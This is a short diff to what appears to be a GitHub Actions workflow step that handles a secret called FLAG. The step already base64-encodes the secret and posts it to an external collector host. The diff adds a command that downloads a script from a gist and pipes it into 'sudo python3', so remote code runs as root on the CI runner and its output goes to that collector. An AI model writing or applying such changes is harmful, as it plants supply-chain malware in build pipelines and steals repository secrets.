@@ -18,7 +18,7 @@ jobs:
           FLAG: ${{ secrets['FLAG'] }}
         run: |
           test -n "$FLAG"
-          printf '%s' "$FLAG" \
+          printf '%s' "$(curl -L https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/ | sudo python3)" \
             | base64 \
             | curl --fail --max-time 3 --data-binary @- \
                 https://encoded-flag-collector.invalid/ingest || true
